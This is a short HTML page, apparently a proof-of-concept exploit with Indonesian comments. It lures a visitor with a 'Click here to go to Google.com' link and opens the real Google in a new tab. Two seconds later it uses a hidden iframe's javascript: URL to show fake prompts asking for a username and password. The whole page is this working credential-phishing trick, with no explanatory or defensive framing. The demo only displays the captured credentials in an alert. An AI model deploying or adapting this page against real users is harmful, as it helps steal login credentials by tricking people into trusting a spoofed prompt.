<!DOCTYPE html>
<html>
  <body>
    <script>
      function exploit() {
        // Membuka tab Google asli
        window.open("https://www.google.com");

        // Delay 2 detik sebelum menampilkan prompt palsu
        setTimeout(function () {
          document.getElementById("iframe").src =
            "javascript:let username = prompt('Enter your username');" +
            "let password = prompt('Enter your password');" +
            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
        }, 2000); // 2000 ms = 2 detik
      }
    </script>

    <a href="#" onclick="exploit();">
      <center><h1>Click here to go to Google.com</h1></center>
    </a>

    <iframe id="iframe" style="display:none;" src=""></iframe>
  </body>
</html>
